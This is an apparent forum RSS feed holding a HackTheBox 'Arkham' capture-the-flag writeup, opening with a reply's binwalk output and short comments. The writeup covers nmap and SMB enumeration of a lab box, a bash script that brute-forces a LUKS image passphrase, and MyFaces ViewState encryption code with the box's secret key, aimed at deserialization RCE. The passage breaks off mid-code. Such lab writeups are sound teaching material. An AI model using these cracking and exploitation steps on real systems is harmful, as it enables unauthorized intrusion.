+8545963       0x8266AB        Zip archive data, at least v2.0 to extract, compressed size: 621, uncompressed size: 1172, name: Mask/tomcat-stuff/jaspic-providers.xml
+8546680       0x826978        Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 832, name: Mask/tomcat-stuff/faces-config.xml
+8547139       0x826B43        Zip archive data, at least v2.0 to extract, compressed size: 2599, uncompressed size: 7678, name: Mask/tomcat-stuff/server.xml
+8549824       0x8275C0        Zip archive data, at least v2.0 to extract, compressed size: 18347, uncompressed size: 174021, name: Mask/tomcat-stuff/web.xml
+8568254       0x82BDBE        Zip archive data, at least v1.0 to extract, compressed size: 39, uncompressed size: 39, name: Mask/tomcat-stuff/MANIFEST.MF
+8568380       0x82BE3C        Zip archive data, at least v2.0 to extract, compressed size: 7353, uncompressed size: 7586, name: Mask/robin.jpeg
+8575806       0x82DB3E        Zip archive data, at least v2.0 to extract, compressed size: 105045, uncompressed size: 105374, name: Mask/me.jpg
+8680920       0x8475D8        Zip archive data, at least v2.0 to extract, compressed size: 687109, uncompressed size: 687160, name: Mask/mycar.jpg
+9466405       0x907225        End of Zip archive
+9471372       0x90858C        Zlib compressed data, best compression
+9472595       0x908A53        Zlib compressed data, best compression
+9473866       0x908F4A        Zlib compressed data, best compression
+9474910       0x90935E        Zlib compressed data, best compression
+9476109       0x90980D        Zlib compressed data, best compression
+9477488       0x909D70        Zlib compressed data, best compression
+9478727       0x90A247        Zlib compressed data, best compression
+9479984       0x90A730        Zlib compressed data, best compression
+9481063       0x90AB67        Zlib compressed data, best compression
+9482309       0x90B045        Zlib compressed data, best compression
+9483475       0x90B4D3        Zlib compressed data, best compression
+9484696       0x90B998        Zlib compressed data, best compression
+9486076       0x90BEFC        Zlib compressed data, best compression
+9487401       0x90C429        Zlib compressed data, best compression
+9488484       0x90C864        Zlib compressed data, best compression
+9489829       0x90CDA5        Zlib compressed data, best compression
+9491008       0x90D240        Zlib compressed data, best compression
+9492164       0x90D6C4        Zlib compressed data, best compression
+9493467       0x90DBDB        Zlib compressed data, best compression
+9494551       0x90E017        Zlib compressed data, best compression
+9495762       0x90E4D2        Zlib compressed data, best compression
+9497006       0x90E9AE        Zlib compressed data, best compression
+9498214       0x90EE66        Zlib compressed data, best compression
+9499465       0x90F349        Zlib compressed data, best compression
+9501003       0x90F94B        Zlib compressed data, best compression
+9502382       0x90FEAE        Zlib compressed data, best compression
+9503472       0x9102F0        Zlib compressed data, best compression
+9504914       0x910892        Zlib compressed data, best compression
+9506184       0x910D88        Zlib compressed data, best compression
+9507229       0x91119D        Zlib compressed data, best compression
+9508447       0x91165F        Zlib compressed data, best compression
+9509671       0x911B27        Zlib compressed data, best compression
+9511212       0x91212C        Zlib compressed data, best compression
+9512315       0x91257B        Zlib compressed data, best compression
+9513451       0x9129EB        Zlib compressed data, best compression
+9514576       0x912E50        Zlib compressed data, best compression
+9515769       0x9132F9        Zlib compressed data, best compression
+9516891       0x91375B        Zlib compressed data, best compression
+9518239       0x913C9F        Zlib compressed data, best compression
+9519648       0x914220        Zlib compressed data, best compression
+9520925       0x91471D        Zlib compressed data, best compression
+9522094       0x914BAE        Zlib compressed data, best compression
+9523211       0x91500B        Zlib compressed data, best compression
+9524427       0x9154CB        Zlib compressed data, best compression
+9525571       0x915943        Zlib compressed data, best compression
+9526903       0x915E77        Zlib compressed data, best compression
+9527889       0x916251        Zlib compressed data, best compression
+9529086       0x9166FE        Zlib compressed data, best compression
+9530509       0x916C8D        Zlib compressed data, best compression
+9531837       0x9171BD        Zlib compressed data, best compression
+9533167       0x9176EF        Zlib compressed data, best compression
+9534318       0x917B6E        Zlib compressed data, best compression
+9535588       0x918064        Zlib compressed data, best compression
+9536718       0x9184CE        Zlib compressed data, best compression
+9537917       0x91897D        Zlib compressed data, best compression
+9539200       0x918E80        Zlib compressed data, best compression
+9540329       0x9192E9        Zlib compressed data, best compression
+9541765       0x919885        Zlib compressed data, best compression
+9542884       0x919CE4        Zlib compressed data, best compression
+9544358       0x91A2A6        Zlib compressed data, best compression
+9545684       0x91A7D4        Zlib compressed data, best compression
+9546938       0x91ACBA        Zlib compressed data, best compression
+9548238       0x91B1CE        Zlib compressed data, best compression
+9549423       0x91B66F        Zlib compressed data, best compression
+9550638       0x91BB2E        Zlib compressed data, best compression
+9551843       0x91BFE3        Zlib compressed data, best compression
+9553186       0x91C522        Zlib compressed data, best compression
+9554323       0x91C993        Zlib compressed data, best compression
+9555393       0x91CDC1        Zlib compressed data, best compression
+9556590       0x91D26E        Zlib compressed data, best compression
+9557657       0x91D699        Zlib compressed data, best compression
+9558749       0x91DADD        Zlib compressed data, best compression
+9560076       0x91E00C        Zlib compressed data, best compression
+9561578       0x91E5EA        Zlib compressed data, best compression
+9563113       0x91EBE9        Zlib compressed data, best compression
+9564443       0x91F11B        Zlib compressed data, best compression
+9565652       0x91F5D4        Zlib compressed data, best compression
+9566625       0x91F9A1        Zlib compressed data, best compression
+9567711       0x91FDDF        Zlib compressed data, best compression
+9568698       0x9201BA        Zlib compressed data, best compression
+9569818       0x92061A        Zlib compressed data, best compression
+9571031       0x920AD7        Zlib compressed data, best compression
+9572203       0x920F6B        Zlib compressed data, best compression
+9573381       0x921405        Zlib compressed data, best compression
+9574664       0x921908        Zlib compressed data, best compression
+9575895       0x921DD7        Zlib compressed data, best compression
+9576808       0x922168        Zlib compressed data, best compression
+9578242       0x922702        Zlib compressed data, best compression
+9579509       0x922BF5        Zlib compressed data, best compression
+9580658       0x923072        Zlib compressed data, best compression
+9581882       0x92353A        Zlib compressed data, best compression
+9583058       0x9239D2        Zlib compressed data, best compression
+9584333       0x923ECD        Zlib compressed data, best compression
+9585381       0x9242E5        Zlib compressed data, best compression
+9586665       0x9247E9        Zlib compressed data, best compression
+9587802       0x924C5A        Zlib compressed data, best compression
+9589088       0x925160        Zlib compressed data, best compression
+9590255       0x9255EF        Zlib compressed data, best compression
+9591468       0x925AAC        Zlib compressed data, best compression
+9592560       0x925EF0        Zlib compressed data, best compression
+9593851       0x9263FB        Zlib compressed data, best compression
+9595304       0x9269A8        Zlib compressed data, best compression
+9596524       0x926E6C        Zlib compressed data, best compression
+9597545       0x927269        Zlib compressed data, best compression
+9598667       0x9276CB        Zlib compressed data, best compression
+9599936       0x927BC0        Zlib compressed data, best compression
+9601259       0x9280EB        Zlib compressed data, best compression
+9602229       0x9284B5        Zlib compressed data, best compression
+9603431       0x928967        Zlib compressed data, best compression
+9604721       0x928E71        Zlib compressed data, best compression
+9605966       0x92934E        Zlib compressed data, best compression
+9607370       0x9298CA        Zlib compressed data, best compression
+9608577       0x929D81        Zlib compressed data, best compression
+9609800       0x92A248        Zlib compressed data, best compression
+9610959       0x92A6CF        Zlib compressed data, best compression
+9612161       0x92AB81        Zlib compressed data, best compression
+9613388       0x92B04C        Zlib compressed data, best compression
+9614713       0x92B579        Zlib compressed data, best compression
+9615912       0x92BA28        Zlib compressed data, best compression
+9616994       0x92BE62        Zlib compressed data, best compression
+9618317       0x92C38D        Zlib compressed data, best compression
+9619684       0x92C8E4        Zlib compressed data, best compression
+9620930       0x92CDC2        Zlib compressed data, best compression
+9622226       0x92D2D2        Zlib compressed data, best compression
+9623505       0x92D7D1        Zlib compressed data, best compression
+9624946       0x92DD72        Zlib compressed data, best compression
+9626377       0x92E309        Zlib compressed data, best compression
+9627803       0x92E89B        Zlib compressed data, best compression
+9629157       0x92EDE5        Zlib compressed data, best compression
+9630468       0x92F304        Zlib compressed data, best compression
+9631587       0x92F763        Zlib compressed data, best compression
+9632680       0x92FBA8        Zlib compressed data, best compression
+9633793       0x930001        Zlib compressed data, best compression
+9634974       0x93049E        Zlib compressed data, best compression
+9636184       0x930958        Zlib compressed data, best compression
+9637193       0x930D49        Zlib compressed data, best compression
+9637566       0x930EBE        Unix path: /dotaccent/fi/fl/fraction/hungarumlaut/Lslash/lslash/ogonek/ring 10/.notdef 11/breve/minus 13/.notdef 14/Zcaron/zcaron/caron/dot
+9638621       0x9312DD        Copyright string: "copyright/ordfeminine/guillemotleft/logicalnot/hyphen/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu/para"
+9962496       0x980400        PDF document, version: "1.4"
+9962566       0x980446        Zlib compressed data, best compression
+9962937       0x9805B9        Zlib compressed data, best compression
+9964441       0x980B99        Zlib compressed data, best compression
+9965496       0x980FB8        Zlib compressed data, best compression
+9966680       0x981458        Zlib compressed data, best compression
+9967843       0x9818E3        Zlib compressed data, best compression
+9969062       0x981DA6        Zlib compressed data, best compression
+9970355       0x9822B3        Zlib compressed data, best compression
+9971491       0x982723        Zlib compressed data, best compression
+9972956       0x982CDC        Zlib compressed data, best compression
+9974199       0x9831B7        Zlib compressed data, best compression
+9975488       0x9836C0        Zlib compressed data, best compression
+9976558       0x983AEE        Zlib compressed data, best compression
+9978880       0x984400        XML document, version: "1.0"
+9979118       0x9844EE        Copyright string: "copyright ownership."
+9981952       0x985000        XML document, version: "1.0"
+9982067       0x985073        Unix path: /java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
+9982184       0x9850E8        Unix path: /java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
+9986048       0x986000        XML document, version: "1.0"
+9986286       0x9860EE        Copyright string: "copyright ownership."
+9988096       0x986800        XML document, version: "1.0"
+9988334       0x9868EE        Copyright string: "copyright ownership."
+9990144       0x987000        XML document, version: "1.0"
+9990210       0x987042        Unix path: /java.sun.com/xml/ns/javaee"
+9990319       0x9870AF        Unix path: /java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-facesconfig_1_2.xsd"
+9991168       0x987400        XML document, version: "1.0"
+9991406       0x9874EE        Copyright string: "copyright ownership."
+9999360       0x989400        XML document, version: "1.0"
+9999598       0x9894EE        Copyright string: "copyright ownership."
+10000226      0x989762        Unix path: /xmlns.jcp.org/xml/ns/javaee"
+10000342      0x9897D6        Unix path: /xmlns.jcp.org/xml/ns/javaee
+10000400      0x989810        Unix path: /xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
+10016768      0x98D800        JPEG image data, JFIF standard 1.01
+10024960      0x98F800        JPEG image data, JFIF standard 1.01
+10041344      0x993800        JPEG image data, EXIF standard
+10041356      0x99380C        TIFF image data, little-endian offset of first image directory: 8
+10057728      0x997800        JPEG image data, JFIF standard 1.01
+
+
+↳ ls
+7EC00.ext    90B045.zlib  90E9AE.zlib  91257B.zlib  915E77.zlib  919885.zlib  91D26E.zlib  920AD7.zlib  9242E5.zlib  927BC0.zlib  92B579.zlib  92F304.zlib  9818E3.zlib
+800000.ext   90B4D3       90EE66       9129EB       916251       919CE4       91D699       920F6B       9247E9       9280EB       92BA28       92F763       981DA6
+825A23.zip   90B4D3.zlib  90EE66.zlib  9129EB.zlib  916251.zlib  919CE4.zlib  91D699.zlib  920F6B.zlib  9247E9.zlib  9280EB.zlib  92BA28.zlib  92F763.zlib  981DA6.zlib
+85000.ext    90B998       90F349       912E50       9166FE       91A2A6       91DADD       921405       924C5A       9284B5       92BE62       92FBA8       9822B3
+86C00.ext    90B998.zlib  90F349.zlib  912E50.zlib  9166FE.zlib  91A2A6.zlib  91DADD.zlib  921405.zlib  924C5A.zlib  9284B5.zlib  92BE62.zlib  92FBA8.zlib  9822B3.zlib
+90858C       90BEFC       90F94B       9132F9       916C8D       91A7D4       91E00C       921908       925160       928967       92C38D       930001       982723
+90858C.zlib  90BEFC.zlib  90F94B.zlib  9132F9.zlib  916C8D.zlib  91A7D4.zlib  91E00C.zlib  921908.zlib  925160.zlib  928967.zlib  92C38D.zlib  930001.zlib  982723.zlib
+908A53       90C429       90FEAE       91375B       9171BD       91ACBA       91E5EA       921DD7       9255EF       928E71       92C8E4       93049E       982CDC
+908A53.zlib  90C429.zlib  90FEAE.zlib  91375B.zlib  9171BD.zlib  91ACBA.zlib  91E5EA.zlib  921DD7.zlib  9255EF.zlib  928E71.zlib  92C8E4.zlib  93049E.zlib  982CDC.zlib
+908F4A       90C864       9102F0       913C9F       9176EF       91B1CE       91EBE9       922168       925AAC       92934E       92CDC2       930958       9831B7
+908F4A.zlib  90C864.zlib  9102F0.zlib  913C9F.zlib  9176EF.zlib  91B1CE.zlib  91EBE9.zlib  922168.zlib  925AAC.zlib  92934E.zlib  92CDC2.zlib  930958.zlib  9831B7.zlib
+90935E       90CDA5       910892       914220       917B6E       91B66F       91F11B       922702       925EF0       9298CA       92D2D2       930D49       9836C0
+90935E.zlib  90CDA5.zlib  910892.zlib  914220.zlib  917B6E.zlib  91B66F.zlib  91F11B.zlib  922702.zlib  925EF0.zlib  9298CA.zlib  92D2D2.zlib  930D49.zlib  9836C0.zlib
+90980D       90D240       910D88       91471D       918064       91BB2E       91F5D4       922BF5       9263FB       929D81       92D7D1       980446       983AEE
+90980D.zlib  90D240.zlib  910D88.zlib  91471D.zlib  918064.zlib  91BB2E.zlib  91F5D4.zlib  922BF5.zlib  9263FB.zlib  929D81.zlib  92D7D1.zlib  980446.zlib  983AEE.zlib
+909D70       90D6C4       91119D       914BAE       9184CE       91BFE3       91F9A1       923072       9269A8       92A248       92DD72       9805B9       984400.xml
+909D70.zlib  90D6C4.zlib  91119D.zlib  914BAE.zlib  9184CE.zlib  91BFE3.zlib  91F9A1.zlib  923072.zlib  9269A8.zlib  92A248.zlib  92DD72.zlib  9805B9.zlib  985000.xml
+90A247       90DBDB       91165F       91500B       91897D       91C522       91FDDF       92353A       926E6C       92A6CF       92E309       980B99       986000.xml
+90A247.zlib  90DBDB.zlib  91165F.zlib  91500B.zlib  91897D.zlib  91C522.zlib  91FDDF.zlib  92353A.zlib  926E6C.zlib  92A6CF.zlib  92E309.zlib  980B99.zlib  986800.xml
+90A730       90E017       911B27       9154CB       918E80       91C993       9201BA       9239D2       927269       92AB81       92E89B       980FB8       987000.xml
+90A730.zlib  90E017.zlib  911B27.zlib  9154CB.zlib  918E80.zlib  91C993.zlib  9201BA.zlib  9239D2.zlib  927269.zlib  92AB81.zlib  92E89B.zlib  980FB8.zlib  987400.xml
+90AB67       90E4D2       91212C       915943       9192E9       91CDC1       92061A       923ECD       9276CB       92B04C       92EDE5       981458       989400.xml
+90AB67.zlib  90E4D2.zlib  91212C.zlib  915943.zlib  9192E9.zlib  91CDC1.zlib  92061A.zlib  923ECD.zlib  9276CB.zlib  92B04C.zlib  92EDE5.zlib  981458.zlib  Mask
+90B045       90E9AE       91257B       915E77       919885       91D26E       920AD7       9242E5       927BC0       92B579       92F304       9818E3
+</code></pre>
+<p>And just only rooting with the easy way hahaha(I’m so stupid for this privesc). Thanks for the awesome privesc guide!</p>
+          <p><a href="https://0x00sec.org/t/hackthebox-writeup-arkham/15541/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/hackthebox-writeup-arkham/15541/3</link>
+        <pubDate>Mon, 12 Aug 2019 05:22:25 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15541-3</guid>
+        <source url="https://0x00sec.org/t/hackthebox-writeup-arkham/15541.rss">HackTheBox Writeup: Arkham</source>
+      </item>
+      <item>
+        <title>HackTheBox Writeup: Arkham</title>
+        <dc:creator><![CDATA[Foox]]></dc:creator>
+        <description><![CDATA[
+            <p>Good work baud! You always do a good job!</p>
+          <p><a href="https://0x00sec.org/t/hackthebox-writeup-arkham/15541/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/hackthebox-writeup-arkham/15541/2</link>
+        <pubDate>Sat, 10 Aug 2019 16:09:49 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-15541-2</guid>
+        <source url="https://0x00sec.org/t/hackthebox-writeup-arkham/15541.rss">HackTheBox Writeup: Arkham</source>
+      </item>
+      <item>
+        <title>HackTheBox Writeup: Arkham</title>
+        <dc:creator><![CDATA[Baud]]></dc:creator>
+        <description><![CDATA[
+            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/11eaeec32b8610728fa51dbf24560f2be789aa48.png" alt="image" data-base62-sha1="2yvsodiEz4fdMX6se6loVKZsFWE" width="598" height="378"><br>
+Arkham is one of my favorite boxes on HTB and it just got retired, I personally wouldn’t have rated it as Medium but maybe it’s just because it’s the hardest Windows box I have faced so far, and it proved to be a lot of fun and a good way to learn more about Windows internals and post exploitation. Keep in mind that this is going to be a rather long writeup as I like showing all the steps and the thought process behind them. That being said, let’s start from the very beginning: enumeration.</p>
+<hr>
+<p><strong>Drawing the perimeter</strong></p>
+<p>The usual basic nmap scan with service enumeration (-sV) and execution of default NSE scripts (-sC) on all ports (-p-) returns a few ports that may be of our interest:</p>
+<pre><code>┌─[baud@parrot]─[~/arkham]
+└──╼ $sudo nmap -sC -sV -p- -oA nmap 10.10.10.130
+[sudo] password di baud:
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-07 19:19 CEST
+Nmap scan report for 10.10.10.130
+Host is up (0.025s latency).
+Not shown: 65528 filtered ports
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+8080/tcp  open  http          Apache Tomcat 8.5.37
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Mask Inc.
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -27s, deviation: 0s, median: -27s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2019-08-07 19:21:44
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 206.66 seconds
+</code></pre>
+<p>First of all, from the version of IIS running on port 80 (IIS 10.0) we can already tell we are dealing with either Windows Server 2016 or Windows 10, and opening the address <a href="http://10.10.10.130/" rel="noopener nofollow ugc">http://10.10.10.130</a> on a browser shows a default unalterated installation of IIS:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6260c4912a2db4cfbbab4f7d7a54175f03801647.png" alt="image" data-base62-sha1="e2i7cQsXNHIoavAPV76VmkNJD6f" width="690" height="486"><br>
+Running gobuster with a big dictionary doesn’t return any results either so better focus somewhere else.</p>
+<pre><code>┌─[✗]─[baud@parrot]─[~/arkham]
+└──╼ $gobuster dir -w ../SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.130
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.130
+[+] Threads:        50
+[+] Wordlist:       ../SecLists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2019/08/08 17:12:31 Starting gobuster
+===============================================================
+===============================================================
+2019/08/08 17:12:46 Finished
+===============================================================
+</code></pre>
+<p>For example, there’s a second web server running on port 8080, this time it’s an Apache Tomcat server and there’s an actual custom website:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/66273c6743fcf0394df6da340b90b2aa4f8f0d55.jpeg" alt="image" data-base62-sha1="ezGLpcX02Y3jpaUy3oSnZb3WBRH" width="690" height="487"><br>
+The website seems to be advertising a service called “Masks”, name which is actually a hint on the technology behind this web application, in fact the only functional button on the website is the “Subscription” button, which redirects to this URL:</p>
+<pre><code>http://10.10.10.130:8080/userSubscribe.faces
+</code></pre>
+<p>The .faces extension tells us this page relies on the Java Server Faces framework (JFS), possibly the Apache MyFaces implementation since this is an Apache server. JFS is a framework used to design web-based user interfaces, and on this site it’s used to handle this simple subscription form:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c9fd5d2a6b9c1d2c599a7cc7322b1a093fd0ffa1.png" alt="image" data-base62-sha1="sOSNG5WvnfsDsFObYhhf3TyeZHP" width="645" height="413"><br>
+The button generates a POST request to the same page, sending the server not only the address we provide, but also a hidden input field that was in the HTML code, called “javax.faces.ViewState”:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c6ee0960e32b6ecaaf08eea5bb005acc4067eefe.png" alt="image" data-base62-sha1="snOwSq8pYECwWs6UdwMrzv4uHzE" width="690" height="135"><br>
+With a little <a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html" rel="noopener nofollow ugc">research</a> I discover that ViewState is a variable used by JFS to determine what components are supposed to be displayed on the page, and it’s actually a serialized Java object which when not configured correctly can lead to RCE vulnerabilities. Because some implementations of JSF didn’t encrypt or sign this ViewState string it is possible for an attacker to craft a malicious serialized Java object to send in place of the original, this object can use the Java gadgets available to the application to execute code.</p>
+<p>Unfortunately for us, Apache MyFaces enables ViewState encryption by default using DES/ECB/PKCS5 Padding and even an SHA1 HMAC with a secret key to verify the validity of the data before it is decrypted server-side. If you’re interested in knowing how all this works you’ll find some Java pseudo-code later in this writeup or you can consult <a href="https://www.programcreek.com/java-api-examples/?code=apache/myfaces-trinidad/myfaces-trinidad-master/trinidad-impl/src/main/java/org/apache/myfaces/trinidadinternal/util/StateUtils.java" rel="noopener nofollow ugc">the actual source code</a> responsible for encryption and decryption of the serialized object. Let’s leave all this information on hold for some time and continue exploring the box.</p>
+<p>All gobuster can find on this second web server is a bunch of resource folders that we cannot list:</p>
+<pre><code>/css
+/favicons
+/fonts
+/images
+/js
+</code></pre>
+<p>And excluding the two RPC ports I saved the most interesting one for last: SMB. Let’s list the available shares using smbclient:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/60347d1a14a0a5d955ee0db6719b9c11fa2fc33b.png" alt="image" data-base62-sha1="dJ4icKyp7HFDOHyWw0aZAT5HoCf" width="645" height="226"><br>
+Despite it containing “secrets” the BatShare folder is accessible without authentication and it contains a .zip file:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3fdb6fc7a26b0abaa52de5a9a9236062736d51c9.png" alt="image" data-base62-sha1="96UdJkL07MFbCZJ5g9EFuA40d7z" width="690" height="176"></p>
+<pre><code>smb: \&gt; get appserver.zip
+getting file \appserver.zip of size 4046695 as appserver.zip (1415,4 KiloBytes/sec) (average 1415,4 KiloBytes/sec)
+smb: \&gt; exit
+┌─[baud@parrot]─[~]
+└──╼ $file appserver.zip
+appserver.zip: Zip archive data, at least v2.0 to extract
+┌─[baud@parrot]─[~]
+└──╼ $mv appserver.zip arkham/
+┌─[baud@parrot]─[~]
+└──╼ $cd arkham
+┌─[baud@parrot]─[~/arkham]
+└──╼ $unzip appserver.zip
+Archive:  appserver.zip
+  inflating: IMPORTANT.txt           
+  inflating: backup.img              
+</code></pre>
+<p>The IMPORTANT.txt file contains a note for Alfred from Bruce, anticipating us that backup.img is password protected:</p>
+<pre><code>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
+</code></pre>
+<p>Now it’s time for some trial and error. The easiest way to go past this obstacle is creating a subset of a big dictionary containing only Batman-related passwords to make our lives easier, I’m going to use rockyou.txt:</p>
+<pre><code>$ cat /usr/share/wordlists/rockyou.txt | egrep 'batman|robin|alfred|joker|scarecrow|gotham' &gt; wordlist.txt
+</code></pre>
+<p>This command creates a new wordlist with all the entries in rockyou.txt that contain the specified Batman-related words. This returns less than 6000 passwords, much less than having to deal with the whole huge original dictionary:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/699f89e50a6ca25aa8c0dc83fc994901f92bba05.png" alt="image" data-base62-sha1="f4nWycnVKfiNrdzlF8sXAsZy84J" width="459" height="85"><br>
+Because these are still a lot of passwords it’s necessary to automate the password guessing process. First let’s check what kind of image file we are dealing with:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7cdde08ac25728779eade1fb8999ef4dcac21904.png" alt="image" data-base62-sha1="hOCzHDfTTXbkkQSaNAt5DykLiF6" width="690" height="61"><br>
+Because it’s a LUKS file we can use the cryptsetup utility to work with it, and it comes really handy that it supports an option to verify passwords:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f5e6dd4b696844417ab7e58051e3499ca26cd50.png" alt="image" data-base62-sha1="iaKX1vhzfj7pjLnAihjuU5wVmP6" width="690" height="139"><br>
+Thanks to this a simple bash script can be written to bruteforce the file:</p>
+<pre><code class="lang-bash"># read a line from the wordlist
+cat wordlist.txt | while read i; do
+        echo -ne "\rTrying: \"$i\""\\r
+        # pass the current password attempt to cryptsetup (the .img file is passed from stdin)
+        echo $i | cryptsetup luksOpen $1 x --test-passphrase -T1 2&gt;/dev/null
+        # grab cryptsetup's exit code
+        STATUS=$?
+        # was the operation successful?
+        if [ $STATUS -eq 0 ]; then
+                echo -e "\nPASSWORD FOUND: \"$i\""
+                break
+        fi
+   done
+</code></pre>
+<p>The script is a little slow but it does the job and the password is found:</p>
+<pre><code>┌─[root@parrot]─[/home/baud/arkham]
+└──╼ #./luksBrute.sh backup.img
+Trying: "batman"
+Trying: "alfredo"
+Trying: "alfred"
+Trying: "robinson"
+Trying: "batman1"
+Trying: "joker"
+Trying: "robin"
+[....]
+PASSWORD FOUND: "batmanforever"
+</code></pre>
+<p>cryptsetup automatically mapped the image file on to /dev/mapper/x so it needs to be mounted:</p>
+<pre><code>┌─[root@parrot]─[/home/baud/arkham]
+└──╼ # mkdir /mnt/arkham
+┌─[root@parrot]─[/home/baud/arkham]
+└──╼ # mount /dev/mapper/x /mnt/arkham
+┌─[root@parrot]─[/home/baud/arkham]
+└──╼ # ls -la /mnt/arkham/
+totale 14
+drwxr-xr-x 4 root root  1024 dic 25  2018 .
+drwxr-xr-x 1 root root    38 ago  7 19:23 ..
+drwx------ 2 root root 12288 dic 25  2018 lost+found
+drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
+</code></pre>
+<p>lost+found is empty but Mask contains MyFaces configuration files, other than a few random images which don’t contain anything interesting and have nothing to hide:</p>
+<pre><code>┌─[root@parrot]─[/mnt/arkham]
+└──╼ #ls -ls Mask
+totale 880
+  1 drwxr-xr-x 2 root root   1024 dic 25  2018 docs
+95 -rw-rw-r-- 1 root root  96978 dic 25  2018 joker.png
+103 -rw-rw-r-- 1 root root 105374 dic 25  2018 me.jpg
+672 -rw-rw-r-- 1 root root 687160 dic 25  2018 mycar.jpg
+  8 -rw-rw-r-- 1 root root   7586 dic 25  2018 robin.jpeg
+  1 drwxr-xr-x 2 root root   1024 dic 25  2018 tomcat-stuff
+┌─[root@parrot]─[/mnt/arkham]
+└──╼ #ls -la Mask/tomcat-stuff
+totale 193
+drwxr-xr-x 2 root root   1024 dic 25  2018 .
+drwxrwxr-x 4 root root   1024 dic 25  2018 ..
+-rw-r--r-- 1 root root   1368 dic 25  2018 context.xml
+-rw-r--r-- 1 root root    832 dic 25  2018 faces-config.xml
+-rw-r--r-- 1 root root   1172 dic 25  2018 jaspic-providers.xml
+-rw-r--r-- 1 root root     39 dic 25  2018 MANIFEST.MF
+-rw-r--r-- 1 root root   7678 dic 25  2018 server.xml
+-rw-r--r-- 1 root root   2208 dic 25  2018 tomcat-users.xml
+-rw-r--r-- 1 root root 174021 dic 25  2018 web.xml
+-rw-r--r-- 1 root root   3498 dic 25  2018 web.xml.bak
+</code></pre>
+<p>If you’re wondering, docs contains the scripts of Batman Begins. Confused? So am I. But here’s something very interesting to break the confusion, by taking a look at the configuration files I discover the encryption settings used by the server:</p>
+<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9927d49ba322e4696b7899fb31bb43a9ddb15950.png" alt="image" data-base62-sha1="lQSo8YjQ3sEStnnLDPnlGIpx8pq" width="690" height="451"><br>
+Now that I know the secret keys used by the web application to encrypt and decrypt the ViewState object I can send my own malicious objects to achieve RCE.</p>
+<hr>
+<p><strong>A bit of cryptography</strong></p>
+<p>I took a look at the MyFaces code to see how it works out of curiosity and altered it a bit to get rid of stuff I don’t need and to make it more readable, this is the function responsible for encrypting objects:</p>
+<pre><code class="lang-java">public static byte[] encrypt(byte[] insecure, ExternalContext ctx)
+{
+    // no IV by default
+    byte[] iv = null;
+    // create the mac object
+    Mac mac = Mac.getInstance("HmacSHA1");
+    // give it the secret key
+    mac.init("SnNGOTg3Ni0=");
+    // declare the output cihper
+    Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
+    // initialize it with the secret key
+    cipher.init(Cipher.ENCRYPT_MODE, "SnNGOTg3Ni0=");
+    // SHA1 output = 20 bytes
+    int macLenght = mac.getMacLength();
+    // this array of bytes will contain the encrypted data. The mac is appeneded to it
+    byte[] secure = new byte[cipher.getOutputSize(insecure.length) + macLenght];
+    // encrypt data "insecure" and store the cipher in "secure"
+    int secureCount = cipher.doFinal(insecure, 0, insecure.length, secure);
+    // update the mac with the current params: source buffer, offset, amount of bytes
+    mac.update(secure, 0, secureCount);
+    // and then calculate it
+    mac.doFinal(secure, secureCount);
+    return secure;
+}
+</code></pre>
+<p>And this one decrypts them:</p>
+<pre><code class="lang-java">public static byte[] decrypt(byte[] secure, ExternalContext ctx)
+{
+    // no IV by default
+    byte[] iv = null;
+    // create the mac object
+    Mac mac = Mac.getInstance("HmacSHA1");
+    // give the object the secret key
+    mac.init("SnNGOTg3Ni0=");
+    // create a DES cipher for the decryption process
